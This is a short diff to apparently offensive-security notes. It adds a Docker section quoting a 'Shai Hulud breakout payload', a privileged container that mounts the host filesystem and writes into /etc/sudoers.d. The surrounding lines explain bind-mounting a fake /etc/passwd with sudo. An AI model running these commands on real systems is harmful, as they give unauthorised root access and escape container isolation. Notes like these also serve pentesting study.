@@ -86,3 +86,7 @@ End Sub
   - We can create our own version and put it in `/tmp/passwd` and then run `sudo mount -o bind /tmp/passwd /etc/passwd`
   - Now, anything that reads `/etc/passwd` will read our version, even though actual `/etc/passwd` is unchanged
 
+## Docker
+
+Shai Hulud breakout payload: `docker run --rm --privileged -v /:/host ubuntu bash -c "cp /host/tmp/runner /host/etc/sudoers.d/runner"`
+
